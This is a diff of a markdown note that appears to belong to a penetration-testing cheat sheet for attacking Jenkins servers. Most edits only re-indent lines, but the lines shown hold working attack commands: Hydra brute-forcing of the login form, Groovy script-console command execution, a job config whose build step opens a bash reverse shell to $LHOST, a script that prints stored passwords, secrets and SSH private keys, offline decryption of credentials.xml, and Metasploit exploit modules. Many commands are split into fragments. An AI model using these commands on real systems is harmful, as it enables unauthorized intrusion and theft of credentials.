@@ -3,7 +3,7 @@ id: "5yizhd9yemptl2n9i"
 title: "jenkins"
 description: ""
 tags: []
-order: "12"
+order: 12
 createdAt: "2026-05-31T09:34:43.014Z"
 updatedAt: "2026-05-31T09:34:59.239Z"
 ---
@@ -122,7 +122,7 @@ curl -s http://$TARGET:8080/script -o /dev/null -w "%{http_code}"
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt http-form-post://$TARGET:8080/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
 ```
 
-_spring_
+_Brute Force_
 
 **Tags:** jenkins, bruteforce, hydra, metasploit
 <!-- cmd: {"id":"6bhliat10mptl2zbt","language":"bash","sectionId":"akin7obvtmptl2z7h","tags":["jenkins","bruteforce","hydra","metasploit"]} -->
@@ -190,20 +190,16 @@ _Authentication_
 
 ### m05rauxysmptl2zd2
 ```bash
--d "j_username=$USER&j_password=$PASS&from=%2F" \
+  -d "j_username=$USER&j_password=$PASS&from=%2F" \
 ```
-
-_username=$USER&j_
 
 **Tags:** jenkins, authentication, api-token
 <!-- cmd: {"id":"m05rauxysmptl2zd2","language":"bash","sectionId":"t6nwpimu6mptl2z7m","tags":["jenkins","authentication","api-token"]} -->
 
 ### ktyamgexemptl2zd6
 ```bash
-http://$TARGET:8080/j_spring_security_check
+  http://$TARGET:8080/j_spring_security_check
 ```
-
-_spring_
 
 **Tags:** jenkins, authentication, api-token
 <!-- cmd: {"id":"ktyamgexemptl2zd6","language":"bash","sectionId":"t6nwpimu6mptl2z7m","tags":["jenkins","authentication","api-token"]} -->
@@ -279,7 +275,7 @@ curl -u $USER:$PASS http://$TARGET:8080/scriptText \
 
 ### 8m8e13hgpmptl2zes
 ```bash
---data-urlencode 'script=def sout=new StringBuilder();def cmd=["bash","-c","id"].execute();cmd.waitForProcessOutput(sout,new StringBuilder());println(sout)' \
+  --data-urlencode 'script=def sout=new StringBuilder();def cmd=["bash","-c","id"].execute();cmd.waitForProcessOutput(sout,new StringBuilder());println(sout)' \
 ```
 
 **Tags:** jenkins, rce, groovy, script-console, exploitation
@@ -287,7 +283,7 @@ curl -u $USER:$PASS http://$TARGET:8080/scriptText \
 
 ### 1e9p12t9cmptl2zey
 ```bash
--H "$CRUMB_FIELD: $CRUMB"
+  -H "$CRUMB_FIELD: $CRUMB"
 ```
 
 **Tags:** jenkins, rce, groovy, script-console, exploitation
@@ -348,7 +344,7 @@ _Job-Based RCE Create or modify Jenkins jobs to execute OS commands._
 
 ### 3x0d5ppbpmptl2zg3
 ```bash
--H "$CRUMB_FIELD: $CRUMB" \
+  -H "$CRUMB_FIELD: $CRUMB" \
 ```
 
 **Tags:** jenkins, job, rce, exploitation
@@ -356,7 +352,7 @@ _Job-Based RCE Create or modify Jenkins jobs to execute OS commands._
 
 ### ibpcfhbglmptl2zg8
 ```bash
--H "Content-Type: text/xml" \
+  -H "Content-Type: text/xml" \
 ```
 
 **Tags:** jenkins, job, rce, exploitation
@@ -364,7 +360,7 @@ _Job-Based RCE Create or modify Jenkins jobs to execute OS commands._
 
 ### ls74ksaavmptl2zgd
 ```bash
--d '<project><builders><hudson.tasks.Shell><command>bash -i &gt;&amp; /dev/tcp/$LHOST/4444 0&gt;&amp;1</command></hudson.tasks.Shell></builders></project>'
+  -d '<project><builders><hudson.tasks.Shell><command>bash -i &gt;&amp; /dev/tcp/$LHOST/4444 0&gt;&amp;1</command></hudson.tasks.Shell></builders></project>'
 ```
 
 **Tags:** jenkins, job, rce, exploitation
@@ -380,7 +376,7 @@ curl -u $USER:$PASS -X POST "http://$TARGET:8080/job/pwn/build" \
 
 ### k2kkrjwtlmptl2zgm
 ```bash
--H "$CRUMB_FIELD: $CRUMB"
+  -H "$CRUMB_FIELD: $CRUMB"
 ```
 
 **Tags:** jenkins, job, rce, exploitation
@@ -398,8 +394,6 @@ curl -u $USER:$PASS "http://$TARGET:8080/job/$JOB/lastBuild/consoleText"
 ```bash
 use exploit/multi/http/jenkins_script_console
 ```
-
-_script_
 
 **Tags:** jenkins, job, rce, exploitation
 <!-- cmd: {"id":"tzhypcai9mptl2zgw","language":"bash","sectionId":"2e5yv6fg7mptl2z7w","tags":["jenkins","job","rce","exploitation"]} -->
@@ -499,7 +493,7 @@ def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredenti
 
 ### o2b3puzz9mptl2zix
 ```bash
-com.cloudbees.plugins.credentials.common.StandardCredentials.class,
+  com.cloudbees.plugins.credentials.common.StandardCredentials.class,
 ```
 
 **Tags:** jenkins, credentials, secrets, post-exploitation
@@ -507,7 +501,7 @@ com.cloudbees.plugins.credentials.common.StandardCredentials.class,
 
 ### etzehrfc1mptl2zj2
 ```bash
-jenkins.model.Jenkins.instance, null, null)
+  jenkins.model.Jenkins.instance, null, null)
 ```
 
 **Tags:** jenkins, credentials, secrets, post-exploitation
@@ -523,7 +517,7 @@ for(c in creds) {
 
 ### 51v28pw9smptl2zjd
 ```bash
-if(c instanceof UsernamePasswordCredentialsImpl) {
+  if(c instanceof UsernamePasswordCredentialsImpl) {
 ```
 
 **Tags:** jenkins, credentials, secrets, post-exploitation
@@ -531,7 +525,7 @@ if(c instanceof UsernamePasswordCredentialsImpl) {
 
 ### 5yofcy2szmptl2zjg
 ```bash
-println("Username: ${c.username} Password: ${c.password}")
+    println("Username: ${c.username} Password: ${c.password}")
 ```
 
 **Tags:** jenkins, credentials, secrets, post-exploitation
@@ -539,7 +533,7 @@ println("Username: ${c.username} Password: ${c.password}")
 
 ### 1xkzq7n6umptl2zjl
 ```bash
-} else if(c instanceof StringCredentialsImpl) {
+  } else if(c instanceof StringCredentialsImpl) {
 ```
 
 **Tags:** jenkins, credentials, secrets, post-exploitation
@@ -547,7 +541,7 @@ println("Username: ${c.username} Password: ${c.password}")
 
 ### 40t6yba0imptl2zjq
 ```bash
-println("Secret: ${c.secret}")
+    println("Secret: ${c.secret}")
 ```
 
 **Tags:** jenkins, credentials, secrets, post-exploitation
@@ -555,7 +549,7 @@ println("Secret: ${c.secret}")
 
 ### ya3iw1kz1mptl2zjv
 ```bash
-} else if(c instanceof BasicSSHUserPrivateKey) {
+  } else if(c instanceof BasicSSHUserPrivateKey) {
 ```
 
 **Tags:** jenkins, credentials, secrets, post-exploitation
@@ -563,7 +557,7 @@ println("Secret: ${c.secret}")
 
 ### hfetzr46pmptl2zjz
 ```bash
-println("SSH Key User: ${c.username}\n${c.privateKeySource.privateKey}")
+    println("SSH Key User: ${c.username}\n${c.privateKeySource.privateKey}")
 ```
 
 **Tags:** jenkins, credentials, secrets, post-exploitation
@@ -571,7 +565,7 @@ println("SSH Key User: ${c.username}\n${c.privateKeySource.privateKey}")
 
 ### nn2695ysdmptl2zk6
 ```bash
-}
+  }
 ```
 
 **Tags:** jenkins, credentials, secrets, post-exploitation
@@ -579,7 +573,7 @@ println("SSH Key User: ${c.username}\n${c.privateKeySource.privateKey}")
 
 ### h761vkj87mptl2zka
 ```bash
-println("ID: ${c.id} Desc: ${c.description}")
+  println("ID: ${c.id} Desc: ${c.description}")
 ```
 
 **Tags:** jenkins, credentials, secrets, post-exploitation
@@ -640,7 +634,7 @@ git clone https://github.com/hoto/jenkins-credentials-decryptor
 
 ### ut82i51i2mptl2zlp
 ```bash
--m /var/lib/jenkins/secrets/master.key \
+  -m /var/lib/jenkins/secrets/master.key \
 ```
 
 **Tags:** jenkins, decryption, credentials, offline
@@ -648,7 +642,7 @@ git clone https://github.com/hoto/jenkins-credentials-decryptor
 
 ### fr9nllv53mptl2zlu
 ```bash
--s /var/lib/jenkins/secrets/hudson.util.Secret \
+  -s /var/lib/jenkins/secrets/hudson.util.Secret \
 ```
 
 **Tags:** jenkins, decryption, credentials, offline
@@ -656,7 +650,7 @@ git clone https://github.com/hoto/jenkins-credentials-decryptor
 
 ### 89unwhew7mptl2zlz
 ```bash
--c /var/lib/jenkins/credentials.xml
+  -c /var/lib/jenkins/credentials.xml
 ```
 
 **Tags:** jenkins, decryption, credentials, offline
@@ -793,8 +787,6 @@ python exploit.py $TARGET 8080
 ```bash
 use exploit/multi/http/jenkins_cli_deserialization
 ```
-
-_cli_
 
 **Tags:** jenkins, cve, exploitation, deserialization
 <!-- cmd: {"id":"ei035wsrdmptl2zp8","language":"bash","sectionId":"bz26i7mknmptl2z8k","tags":["jenkins","cve","exploitation","deserialization"]} -->
